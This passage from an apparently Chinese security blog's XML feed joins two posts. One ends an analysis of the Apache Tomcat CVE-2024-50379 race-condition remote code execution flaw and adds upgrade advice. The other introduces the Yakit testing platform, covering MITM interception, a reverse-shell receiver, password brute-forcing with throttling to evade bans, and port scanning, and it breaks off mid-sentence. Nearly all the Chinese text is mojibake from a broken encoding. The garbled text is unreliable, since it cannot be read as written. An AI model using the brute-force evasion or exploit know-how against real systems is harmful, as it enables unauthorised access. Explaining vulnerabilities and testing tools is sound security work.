src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.01.19.png" style="zoom:50%;"><p>ç©ºèµ„æºä»£è¡¨ä¸å­˜åœ¨ï¼Œäºæ˜¯tomcatä¼šè¿”å›404 ã€‚</p><p>æ‰€ä»¥è¿™ä¸ªæ¼æ´è¦æƒ³åˆ©ç”¨å¿…é¡»æ‰“æ—¶é—´å·®ï¼Œåœ¨ .jsp å˜ä¸º .JSP ä¹‹å‰ã€‚æ­¤æ‰€è°“â€œæ¡ä»¶ç«äº‰â€ã€‚</p><h2 id="3-3-æ€»ç»“"><a href="#3-3-æ€»ç»“" class="headerlink" title="3.3 æ€»ç»“"></a>3.3 æ€»ç»“</h2><ol><li><p>Windowsæ–‡ä»¶ç³»ç»Ÿä¸Tomcatçš„å¤§å°å†™æ•æ„Ÿæ€§å·®å¼‚ï¼š</p><p>Windowsæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œè€ŒTomcatåœ¨å¤„ç†æ–‡ä»¶è·¯å¾„æ—¶é»˜è®¤æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚è¿™ä¸ªå·®å¼‚è¢«æ”»å‡»è€…åˆ©ç”¨æ¥ç»•è¿‡Tomcatçš„è·¯å¾„æ ¡éªŒæœºåˆ¶ã€‚</p></li><li><p>åœ¨Tomcatæºç ä¸­ï¼Œ<code>org.apache.catalina.webresources.AbstractFileResourceSet#file</code>æ–¹æ³•è°ƒç”¨äº†<code>getCanonicalPath</code>æ–¹æ³•ã€‚å½“æ‰§è¡ŒPUTæ“ä½œåï¼Œ<code>getCanonicalPath</code>è¿”å›çš„æ˜¯å°å†™.jspç»“å°¾çš„æ–‡ä»¶ï¼Œç„¶åTomcatä¼šæ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œç”±äºæ–‡ä»¶å·²ç»ä¸Šä¼ ï¼Œ<code>f.exists()</code>ä¼šè¿”å›trueï¼ˆWindowså¤§å°å†™ä¸æ•æ„Ÿï¼‰ï¼Œäºæ˜¯è¿”å›äº†ä¸€ä¸ª<code>FileResource</code>å¯¹è±¡ï¼Œå¯¼è‡´Tomcatæ‰¾åˆ°ç›¸åº”çš„jspå¹¶ç¼–è¯‘æˆservletæ‰§è¡Œï¼Œè§¦å‘RCEã€‚</p></li><li><p>æ—¶é—´å·®åˆ©ç”¨ï¼š</p><p>æ”»å‡»è€…å¿…é¡»åœ¨<code>.jsp</code>å˜ä¸º<code>.JSP</code>ä¹‹å‰åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå› ä¸ºè¿‡äº†è¿™ä¸ªæ—¶é—´å·®ä¹‹åï¼Œ<code>file.getCanonicalPath</code>è·å–çš„å€¼å°±å˜æˆäº†å¤§å†™ç»“å°¾çš„è·¯å¾„ï¼Œä½†è°ƒç”¨<code>file.getAbsolutePath()</code>æ–¹æ³•ä¾ç„¶ä¼šè¿”å›å°å†™ç»“å°¾çš„è·¯å¾„ï¼Œå¯¼è‡´åç»­çš„è·¯å¾„æ£€æŸ¥å¤±è´¥ï¼ŒTomcatä¼šè¿”å›404é”™è¯¯ã€‚</p></li></ol><p>ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2024-50379æ¼æ´åˆ©ç”¨äº†Windowsæ–‡ä»¶ç³»ç»Ÿå’ŒTomcatåœ¨å¤§å°å†™å¤„ç†ä¸Šçš„å·®å¼‚ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼ï¼Œä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿä¸Šä¼ å¹¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><h1 id="å››ã€ä¿®å¤å»ºè®®"><a href="#å››ã€ä¿®å¤å»ºè®®" class="headerlink" title="å››ã€ä¿®å¤å»ºè®®"></a>å››ã€ä¿®å¤å»ºè®®</h1><ul><li>Apacheå®˜æ–¹å·²ç»å‘å¸ƒäº†å®‰å…¨é€šå‘Šå¹¶å‘å¸ƒäº†ä¿®å¤ç‰ˆæœ¬ï¼Œå»ºè®®ç”¨æˆ·å°½å¿«å‡çº§åˆ°ä»¥ä¸‹ç‰ˆæœ¬ï¼š<ul><li>Apache Tomcat 11.0.2 æˆ–æ›´é«˜ç‰ˆæœ¬</li><li>Apache Tomcat 10.1.34 æˆ–æ›´é«˜ç‰ˆæœ¬</li><li>Apache Tomcat 9.0.98 æˆ–æ›´é«˜ç‰ˆæœ¬</li></ul></li><li>å®˜æ–¹ä¸‹è½½é“¾æ¥ï¼š<ul><li>11ç‰ˆæœ¬ï¼š<a href="https://tomcat.apache.org/download-11.cgi">ä¸‹è½½é“¾æ¥</a></li><li>10ç‰ˆæœ¬ï¼š<a href="https://tomcat.apache.org/download-10.cgi">ä¸‹è½½é“¾æ¥</a></li><li>9ç‰ˆæœ¬ï¼š<a href="https://tomcat.apache.org/download-90.cgi">ä¸‹è½½é“¾æ¥</a>ã€‚</li></ul></li></ul><ul><li><p><strong>ä¸´æ—¶ç¼“è§£æªæ–½</strong>ï¼š</p><ul><li><p>åœ¨ä¸å½±å“ä¸šåŠ¡çš„å‰æä¸‹å°†<code>conf/web.xml</code>æ–‡ä»¶ä¸­çš„<code>readOnly</code>å‚æ•°è®¾ç½®ä¸º<code>true</code>æˆ–ç›´æ¥æ³¨é‡Šè¯¥å‚æ•°ï¼›</p></li><li><p>ç¦ç”¨PUTæ–¹æ³•å¹¶é‡å¯TomcatæœåŠ¡ä»¥å¯ç”¨æ–°çš„é…ç½®ã€‚</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> æ¡ä»¶ç«äº‰RCE </tag>
            
            <tag> Apache-Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yakitå•å…µå®‰å…¨èƒ½åŠ›å¹³å°</title>
      <link href="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/"/>
      <url>/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Yakitä»‹ç»"><a href="#ä¸€ã€Yakitä»‹ç»" class="headerlink" title="ä¸€ã€Yakitä»‹ç»"></a>ä¸€ã€Yakitä»‹ç»</h1><h2 id="1-1-ç®€ä»‹"><a href="#1-1-ç®€ä»‹" class="headerlink" title="1.1 ç®€ä»‹"></a>1.1 ç®€ä»‹</h2><p>Yakitæ˜¯ä¸€æ¬¾é›†æˆåŒ–çš„ç½‘ç»œå®‰å…¨å•å…µå·¥å…·ï¼ŒåŸºäºYakè¯­è¨€å¼€å‘ï¼Œæä¾›å›¾å½¢åŒ–ç•Œé¢ï¼Œæ—¨åœ¨ç®€åŒ–å®‰å…¨æµ‹è¯•æµç¨‹ã€‚å®ƒé›†æˆäº†å¤šç§åŠŸèƒ½ï¼ŒåŒ…æ‹¬MITMæ”»å‡»ã€Webæ¨¡ç³Šæµ‹è¯•ç­‰ï¼Œæ”¯æŒä»ä¿¡æ¯æ”¶é›†åˆ°æ”»å‡»å®æ–½çš„æ¸—é€æµ‹è¯•å…¨æµç¨‹ã€‚Yakité€šè¿‡æ¨¡å—åŒ–è®¾è®¡ï¼Œç»“åˆYaklangè¯­è¨€å’ŒgRPCé€šä¿¡å±‚ï¼Œç¡®ä¿äº†çµæ´»æ€§å’Œæ‰©å±•æ€§ã€‚ç”¨æˆ·æ— éœ€ç¼–å†™ä»£ç å³å¯æ‰§è¡Œå¤æ‚æµ‹è¯•ï¼ŒåŒæ—¶æ”¯æŒè‡ªå®šä¹‰è„šæœ¬ä»¥æ»¡è¶³ç‰¹å®šéœ€æ±‚ã€‚Yakitå¼ºè°ƒåœ¨åˆæ³•æˆæƒä¸‹ä½¿ç”¨ï¼Œä»¥ç¡®ä¿æ‰€æœ‰å®‰å…¨æµ‹è¯•æ´»åŠ¨åˆè§„åˆæ³•ã€‚</p><p>Yak è¯­è¨€æ ¸å¿ƒæä¾›äº†éå¸¸å¼ºå¤§çš„å®‰å…¨èƒ½åŠ›ï¼Œä¸ºäº†è®© Yak æœ¬èº«çš„å®‰å…¨èƒ½åŠ›æ›´å®¹æ˜“è´´è¿‘å¤§å®¶çš„å®é™…ä½¿ç”¨ï¼Œé™ä½ä½¿ç”¨çš„é—¨æ§›ï¼Œæˆ‘ä»¬åœ¨ä¸º Yak ç¼–å†™äº† gRPC æœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªæœåŠ¡å™¨å®ç° / æ„å»ºäº†ä¸€ä¸ªå®¢æˆ·ç«¯ï¼šYakitã€‚</p><p>Yakit æ˜¯ Yak çš„è¡ç”Ÿé¡¹ç›®ï¼Œå¯¹äºä¸€äº›ä¸æƒ³å†™ä»£ç çš„å®‰å…¨ä»ä¸šè€…ï¼ŒYakitä¼šä¸ºYakä¸­æ‰€æœ‰çš„èƒ½åŠ›æä¾›åˆé€‚çš„GUIï¼Œé€šè¿‡Yakitçš„GUIå»æ“æ§å¼•æ“çš„èƒ½åŠ›ï¼Œéšç€ç‰ˆæœ¬æ›´è¿­ï¼ŒGUIä¼šæ›´åŠ æˆç†Ÿã€‚Yakitçš„gRPCæœåŠ¡å™¨ï¼Œè®©ç”¨æˆ·éƒ¨ç½²æ›´åŠ æ–¹ä¾¿å¿«æ·ï¼Œä¸å¹³å°æ— å…³ï¼Œå¯é€‰æ‹©è¿œç¨‹éƒ¨ç½²æˆ–ç›´æ¥æœ¬åœ°å¯åŠ¨åœ¨ä¸»æœºä¸­ä½¿ç”¨ã€‚</p><p>èƒ½åšåˆ°ä»€ä¹ˆï¼Ÿ</p><ol><li>ç±» Burpsuite çš„ MITM åŠ«æŒæ“ä½œå°</li><li>æŸ¥çœ‹æ‰€æœ‰åŠ«æŒåˆ°çš„è¯·æ±‚çš„å†å²è®°å½•ä»¥åŠåˆ†æè¯·æ±‚çš„å‚æ•°</li><li>å…¨çƒç¬¬ä¸€ä¸ªå¯è§†åŒ–çš„ Web æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼šWeb Fuzzer</li><li>Yak Cloud IDEï¼šå†…ç½®æ™ºèƒ½æç¤ºçš„ Yak è¯­è¨€äº‘ IDE</li><li>ShellReceiverï¼šå¼€å¯ TCP æœåŠ¡å™¨æ¥æ”¶åå¼¹äº¤äº’å¼ Shell çš„åè¿</li><li>ç¬¬ä¸‰æ–¹ Yak æ¨¡å—å•†åº—ï¼šç¤¾åŒºä¸»å¯¼çš„ç¬¬ä¸‰æ–¹ Yak æ¨¡å—æ’ä»¶ï¼Œä½ æƒ³è¦çš„åº”æœ‰å°½æœ‰</li></ol><h2 id="1-2-Yakitæ¶æ„"><a href="#1-2-Yakitæ¶æ„" class="headerlink" title="1.2 Yakitæ¶æ„"></a>1.2 Yakitæ¶æ„</h2><p>Yakit çš„æ ¸å¿ƒå¹¶ä¸åœ¨å·¥å…·æœ¬èº«ä¸Šï¼Œè€Œæ˜¯ä¾æ‰˜äº Yak gRPC æ¥å£ï¼› ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä»…ä»…åªæŠŠ Yakit å½“ä½œä¸€ä¸ª â€œè§†çª—â€ æ¥æ“çºµ Yak å¼•æ“æ¥å®Œæˆæˆ‘ä»¬æƒ³è¦å®ç°çš„å®‰å…¨èƒ½åŠ›ã€‚</p><p>ç”¨ä¸€å¼ å›¾æ¥ç®€å•è§£é‡Šä¸€ä¸‹ Yakit çš„æ¶æ„æ˜¯æ€ä¹ˆæ ·ä¸ä¼ ç»Ÿå®‰å…¨å·¥å…·æœ‰æ‰€åŒºåˆ«çš„ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.16.11.png" style="zoom:40%;"><ul><li>Yakit çš„èƒ½åŠ›éœ€è¦ Yak å¼•æ“</li></ul><p>â€‹Yakit æ‰€æœ‰çš„èƒ½åŠ›éƒ½å»ºç«‹åœ¨ Yak å¼•æ“æä¾›å¯¹åº”ç‰ˆæœ¬çš„ gRPC æ¥å£æ”¯æŒçš„åŸºç¡€ä¸Šã€‚</p><p>â€‹æ‰€ä»¥ï¼ŒYak å¼•æ“å¯åŠ¨ä¹‹åï¼ŒYakit æ‰èƒ½è¿æ¥æ‰§è¡Œå„ç§å„æ ·çš„å®‰å…¨èƒ½åŠ›ã€‚</p><h2 id="1-3-ç”¨æˆ·æ•°æ®ä¸æœ¬åœ°æ–‡ä»¶å­˜å‚¨"><a href="#1-3-ç”¨æˆ·æ•°æ®ä¸æœ¬åœ°æ–‡ä»¶å­˜å‚¨" class="headerlink" title="1.3 ç”¨æˆ·æ•°æ®ä¸æœ¬åœ°æ–‡ä»¶å­˜å‚¨"></a>1.3 ç”¨æˆ·æ•°æ®ä¸æœ¬åœ°æ–‡ä»¶å­˜å‚¨</h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œæœ¬åœ°æ–‡ä»¶ä¸ç”¨æˆ·å­˜å‚¨æ•°æ®å°†ä¼šå­˜å‚¨åœ¨ <code>$HOME/yakit-projects/</code> ç›®å½•ä¸‹ã€‚</p><ul><li><p>ç›®å½•ä¸­çš„æ–‡ä»¶åŒ…æ‹¬</p><ol><li><p>MITM éœ€è¦ç”¨åˆ°çš„æ ¹è¯ä¹¦ä¸æ ¹è¯ä¹¦çš„å¯†é’¥</p></li><li><p>sqlite3 æ ¼å¼çš„æ•°æ®åº“ï¼Œæ•°æ®åº“çš„å†…å®¹æ˜¯ Yakit ä½¿ç”¨çš„è®°å½•ï¼ŒåŒ…æ‹¬åŠ«æŒåˆ°çš„è¯·æ±‚ï¼ŒPoCç­‰</p></li></ol></li></ul><p>å¦‚æœæœ¬åœ°æ•°æ®åº“æƒé™é…ç½®ä¸åˆç†ï¼Œå°†ä¼šå¯¼è‡´æ— æ³•å†™å…¥æ•°æ®ç­‰é—®é¢˜é€ æˆ Yakit åŠŸèƒ½ä¸å¯ç”¨ã€‚</p><p>å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ä¿®å¤:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> user ~/yakit-projects<span class="token function">sudo</span> <span class="token function">chmod</span> 0755 ~/yakit-projects<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="äºŒã€å®‰è£…éƒ¨ç½²"><a href="#äºŒã€å®‰è£…éƒ¨ç½²" class="headerlink" title="äºŒã€å®‰è£…éƒ¨ç½²"></a>äºŒã€å®‰è£…éƒ¨ç½²</h1><h2 id="2-1-å®¢æˆ·ç«¯å®‰è£…"><a href="#2-1-å®¢æˆ·ç«¯å®‰è£…" class="headerlink" title="2.1 å®¢æˆ·ç«¯å®‰è£…"></a>2.1 å®¢æˆ·ç«¯å®‰è£…</h2><p><a href="https://yaklang.com/">https://yaklang.com/</a> ã€ä¸‹è½½åœ°å€ã€‘</p><h2 id="2-2-æ ¸å¿ƒå¼•æ“"><a href="#2-2-æ ¸å¿ƒå¼•æ“" class="headerlink" title="2.2 æ ¸å¿ƒå¼•æ“"></a>2.2 æ ¸å¿ƒå¼•æ“</h2><p>1.1.6ç‰ˆæœ¬ä¹‹åå¼•æ“ä¸‹è½½æ–¹å¼ä¸ºè‡ªåŠ¨ä¸‹è½½å®‰è£…ï¼Œé€šè¿‡å®‰è£…åŒ…å®‰è£…å³å¯åŒæ—¶å®‰è£…å®¢æˆ·ç«¯å’Œå¼•æ“ï¼Œæ— éœ€å•ç‹¬å®‰è£…å¼•æ“ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.28.23.png" style="zoom:40%;"><h2 id="2-3-ç•Œé¢åˆè¯†"><a href="#2-3-ç•Œé¢åˆè¯†" class="headerlink" title="2.3 ç•Œé¢åˆè¯†"></a>2.3 ç•Œé¢åˆè¯†</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.34.16.png" style="zoom:35%;"><h2 id="2-4-æœ¬åœ°æ¨¡å¼vsè¿œç¨‹æ¨¡å¼"><a href="#2-4-æœ¬åœ°æ¨¡å¼vsè¿œç¨‹æ¨¡å¼" class="headerlink" title="2.4 æœ¬åœ°æ¨¡å¼vsè¿œç¨‹æ¨¡å¼"></a>2.4 æœ¬åœ°æ¨¡å¼vsè¿œç¨‹æ¨¡å¼</h2><p>ç”±äº Yak æ ¸å¿ƒå¼•æ“ä¸ Yakit çš„åˆ†ç¦»å¼å®‰è£…ï¼ŒYakit ä»…ä»…ä½œä¸ºä¸€ä¸ªå®¢æˆ·ç«¯è€Œå­˜åœ¨ï¼ŒYakit çš„ä½¿ç”¨ç†æ‰€å½“ç„¶å°±åº”è¯¥å­˜åœ¨ä¸¤ç§æ¨¡å¼</p><ol><li><p>æœ¬åœ°æ¨¡å¼ï¼šé»˜è®¤å¯åŠ¨ä¸€ä¸ªéšæœºç«¯å£çš„ <code>yak grpc</code> æœåŠ¡å™¨</p></li><li><p>è¿œç¨‹æ¨¡å¼ï¼šyak grpc å¯ä»¥å¯åŠ¨åœ¨ä»»ä½•å¹³å° / ä»»ä½•ç½‘ç»œä½ç½®ï¼ŒåŒ…æ‹¬</p><ul><li><p>è¿œç«¯æ‰˜ç®¡ä¸»æœº ECS/VPS</p></li><li><p>æœ¬åœ°ä¸ªäºº PC</p></li><li><p>å†…ç½‘ç¯å¢ƒ</p></li></ul></li></ol><p>ä¸æ­¤åŒæ—¶ï¼Œyak grpc å¯åŠ¨å‚æ•°æ”¯æŒè®¾ç½® <code>--tls</code> ä¸ <code>--secret</code> ä»¥å®ç°ä¸€äº›è¿œç¨‹è¿æ¥çš„å®‰å…¨éœ€æ±‚ã€‚</p><p>åŒæ—¶ Yakit æ—¢ç„¶ä½œä¸ºå®¢æˆ·ç«¯ï¼Œåœ¨è¿œç¨‹æ¨¡å¼å’Œæœ¬åœ°æ¨¡å¼ä¸‹ï¼Œé™¤äº†ç½‘ç»œå»¶è¿Ÿä¹‹å¤–ï¼Œå…¶ä»–çš„ä½¿ç”¨ä½“éªŒåº”è¯¥æ˜¯å®Œå…¨ä¸€è‡´çš„ã€‚</p><h1 id="ä¸‰ã€çˆ†ç ´ä¸æœªæˆæƒæ£€æµ‹"><a href="#ä¸‰ã€çˆ†ç ´ä¸æœªæˆæƒæ£€æµ‹" class="headerlink" title="ä¸‰ã€çˆ†ç ´ä¸æœªæˆæƒæ£€æµ‹"></a>ä¸‰ã€çˆ†ç ´ä¸æœªæˆæƒæ£€æµ‹</h1><h2 id="3-1-ç®€ä»‹"><a href="#3-1-ç®€ä»‹" class="headerlink" title="3.1 ç®€ä»‹"></a>3.1 ç®€ä»‹</h2><p>ç ´å’Œæœªæˆæƒæ£€æµ‹æ˜¯ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­ä¸€ç§å¸¸è§çš„æµ‹è¯•æŠ€æœ¯ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºä¸­çš„å£ä»¤æ˜¯å¦å¼ºå¥ï¼ŒYakitçš„çˆ†ç ´ä¸æœªæˆæƒæ£€æµ‹æ¨¡å—åˆ™å®ç°äº†è¯¥éƒ¨åˆ†çš„å†…å®¹ã€‚è¿™ä¸ªæ¨¡å—å¯ä»¥å¯¹å¤šç§å¸¸è§åè®®å’ŒæœåŠ¡ï¼ˆå¦‚ftpã€memcachedã€mongodbã€mssqlã€mysqlã€postgresã€rdpã€redisã€smbã€sshã€tomcatã€vncç­‰ï¼‰è¿›è¡Œå£ä»¤çš„çˆ†ç ´ï¼Œä»¥éªŒè¯ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p><p>è¯¥æ¨¡å—çš„åŸºæœ¬å·¥ä½œåŸç†æ˜¯ï¼šåˆ©ç”¨å­—å…¸å’Œæš´åŠ›ç ´è§£ç­‰æŠ€æœ¯ï¼Œä¸æ–­å°è¯•å„ç§å¯èƒ½çš„å£ä»¤ï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„å£ä»¤ä¸ºæ­¢ã€‚å¦‚æœæ­£ç¡®çš„å£ä»¤è¢«æ‰¾åˆ°ï¼Œé‚£ä¹ˆçˆ†ç ´ç¨‹åºå°†ç«‹å³åœæ­¢ï¼Œå¹¶è¿”å›æˆåŠŸçš„ç»“æœã€‚å¦‚æœåœ¨ä¸€å®šæ—¶é—´å†…æ²¡æœ‰æ‰¾åˆ°æ­£ç¡®çš„å£ä»¤ï¼Œé‚£ä¹ˆçˆ†ç ´ç¨‹åºå°†è¿”å›å¤±è´¥çš„ç»“æœã€‚</p><p>ä¸ºäº†æé«˜çˆ†ç ´æ•ˆç‡å’Œå‡†ç¡®æ€§ï¼Œé‡‡ç”¨å¤šçº¿ç¨‹å’Œå¼‚æ­¥è¯·æ±‚ç­‰æŠ€æœ¯ï¼Œå¯ä»¥åŒæ—¶è¿›è¡Œå¤šä¸ªåè®®å’ŒæœåŠ¡çš„å£ä»¤çˆ†ç ´ï¼Œå¤§å¤§ç¼©çŸ­äº†æµ‹è¯•æ—¶é—´ã€‚åŒæ—¶ï¼Œè¯¥æ¨¡å—è¿˜å¯ä»¥è‡ªåŠ¨åˆ†æå’Œè¯†åˆ«åè®®å’ŒæœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ ¹æ®ä¸åŒç‰ˆæœ¬çš„ç‰¹ç‚¹ï¼Œè¿›è¡Œæ£€æµ‹ã€‚</p><h2 id="3-2-å‚æ•°è®¾ç½®"><a href="#3-2-å‚æ•°è®¾ç½®" class="headerlink" title="3.2 å‚æ•°è®¾ç½®"></a>3.2 å‚æ•°è®¾ç½®</h2><p>ç‚¹å‡»æ›´å¤šå‚æ•°å¯ä»¥è¿›è¡Œå­—å…¸çš„è‡ªå®šä¹‰é…ç½®ä»¥åŠå¹¶å‘å’Œé—´éš”æ—¶é—´ç­‰é«˜çº§å‚æ•°çš„è®¾ç½®ã€‚</p><p>å…³äºå‚æ•°çš„è§£é‡Šï¼š</p><ul><li>çˆ†ç ´ç”¨æˆ·å­—å…¸ï¼šå¯ä»¥é€‰æ‹©ä¸Šä¼ åœ¨<code>Payloadç®¡ç†</code>çš„å­—å…¸è¿›è¡Œçˆ†ç ´</li><li>çˆ†ç ´ç”¨æˆ·ï¼šå¦‚éœ€å¯¹å­—å…¸å†…å®¹è¿›è¡Œè¡¥å……ï¼Œå¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œè¾“å…¥ -</li><li>åŒæ—¶ä½¿ç”¨é»˜è®¤å­—å…¸ï¼šå¦‚å‹¾é€‰åˆ™è¡¨ç¤ºéœ€è¦ä½¿ç”¨è¯¥åŠŸèƒ½å†…ç½®çš„é»˜è®¤å­—å…¸ï¼Œä¸å‹¾é€‰åˆ™è¡¨ç¤ºä¸ä½¿ç”¨ã€‚</li><li>çˆ†ç ´å¯†ç å­—å…¸ã€çˆ†ç ´å¯†ç ã€åŒæ—¶ä½¿ç”¨é»˜è®¤å­—å…¸æ„ä¹‰åŒä¸Š</li><li>è‡ªåŠ¨åœæ­¢ï¼šé‡åˆ°ç¬¬ä¸€ä¸ªçˆ†ç ´ç»“æœæ—¶æ˜¯å¦ç»ˆæ­¢ä»»åŠ¡</li><li>ç›®æ ‡å¹¶å‘ï¼šåŒæ—¶å¯çˆ†ç ´çš„ç›®æ ‡æ•°ï¼Œyakçš„çˆ†ç ´è§„åˆ™ä¸ºåŒæ—¶çˆ†ç ´â€œå¤šä¸ªç›®æ ‡â€ï¼Œæ¯ä¸ªç›®æ ‡ä½å¹¶å‘ã€‚è¿™æ ·åœ¨æœ‰å¤šä¸ªç›®æ ‡çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šå½±å“æ•ˆç‡ï¼Œè€Œä¸”å•ä¸ªç›®æ ‡ä¹Ÿä¸ä¼šè¿‡å¿«å¯¼è‡´è¢«å°ç¦ã€‚</li><li>æœ€å°å»¶è¿Ÿï¼Œæœ€å¤§å»¶è¿Ÿï¼šå¯ç†è§£ä¸ºè¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºsï¼Œè¶…è¿‡æ—¶é—´åˆ™ä¸ä¼šç»§ç»­è¿›è¡Œçˆ†ç ´ã€‚ä¸€èˆ¬æ¥è®²ï¼Œå¦‚æœè¦ ban çˆ†ç ´è¡Œä¸ºçš„è¯ï¼Œé€šå¸¸ä¼šè®¾ç½®ä¸€ä¸ªæ—¶é—´çª—å£ï¼ŒçŸ­æ—¶é—´çª—å£è¢«æ‰“æ»¡ä¼šè®¤ä¸ºå‘ç”Ÿäº†çˆ†ç ´äº‹ä»¶ã€‚å¦‚æœå¯ä»¥å†â€œæ”¾ç¼“â€ é’ˆå¯¹å•ä¸ªç›®æ ‡çš„æµ‹è¯•å¼ºåº¦ï¼Œå…¶å®æœ‰å¯èƒ½å¯ä»¥ç¼“è§£è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§è®¾ç½®æœ€å°å»¶è¿Ÿå’Œæœ€å¤§å»¶è¿Ÿæ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</li></ul><h2 id="3-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰"><a href="#3-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰" class="headerlink" title="3.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰"></a>3.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2015.13.23.png" style="zoom:40%;"><h1 id="å››ã€ç«¯å£æ¢æµ‹å’ŒæŒ‡çº¹æ‰«æ"><a href="#å››ã€ç«¯å£æ¢æµ‹å’ŒæŒ‡çº¹æ‰«æ" class="headerlink" title="å››ã€ç«¯å£æ¢æµ‹å’ŒæŒ‡çº¹æ‰«æ"></a>å››ã€ç«¯å£æ¢æµ‹å’ŒæŒ‡çº¹æ‰«æ</h1><h2 id="4-1-æ¦‚è¿°"><a href="#4-1-æ¦‚è¿°" class="headerlink" title="4.1 æ¦‚è¿°"></a>4.1 æ¦‚è¿°</h2><h3 id="4-1-1-ç«¯å£æ‰«æ"><a href="#4-1-1-ç«¯å£æ‰«æ" class="headerlink" title="4.1.1 ç«¯å£æ‰«æ"></a>4.1.1 ç«¯å£æ‰«æ</h3><p>ç«¯å£æ‰«æå’ŒæŒ‡çº¹è¯†åˆ«æ˜¯æ¸—é€æµ‹è¯•å’Œç½‘ç»œå®‰å…¨é¢†åŸŸä¸­å¸¸ç”¨çš„åŸºç¡€æŠ€æœ¯ä¹‹ä¸€ï¼Œç”¨äºè¯„ä¼°ç›®æ ‡ç³»ç»Ÿçš„å®‰å…¨æ€§å’Œå‘ç°å¯èƒ½å­˜åœ¨çš„æ¼æ´å’Œæ”»å‡»é¢ã€‚ä¹Ÿæ˜¯YakitåŸºç¡€å·¥å…·çš„æ¨¡å—ä¹‹ä¸€ï¼Œæœ¬æ–‡å°†å¯¹<code>ç«¯å£æ¢æµ‹å’ŒæŒ‡çº¹æ‰«ææ¨¡å—</code>è¿›è¡Œç®€å•ä»‹ç»ã€‚</p><p><strong>ç«¯å£æ‰«æ</strong>æ˜¯æŒ‡é€šè¿‡æ‰«æç›®æ ‡ç³»ç»Ÿä¸Šçš„ç«¯å£ï¼Œç¡®å®šå“ªäº›ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œå¹¶ç¡®å®šè¿™äº›å¼€æ”¾çš„ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p>Yakit ä½¿ç”¨çš„ç«¯å£æ‰«æçš„æŠ€æœ¯ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>TCP SYNæ‰«æï¼šè¯¥æŠ€æœ¯åˆ©ç”¨TCPåè®®çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­çš„SYNå’ŒACKæ ‡å¿—æ¥åˆ¤æ–­ç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚æ‰«ææ¨¡å—å‘é€ä¸€ä¸ªSYNæ ‡å¿—çš„æ•°æ®åŒ…ç»™ç›®æ ‡ä¸»æœºï¼Œå¦‚æœç›®æ ‡ä¸»æœºå›åº”äº†ä¸€ä¸ªSYN/ACKæ•°æ®åŒ…ï¼Œå°±è¡¨æ˜è¯¥ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚æ‰«ææ¨¡å—éšå³å‘é€ä¸€ä¸ªRSTæ•°æ®åŒ…ï¼Œä»¥å…³é—­è¿æ¥ã€‚å¦‚æœç›®æ 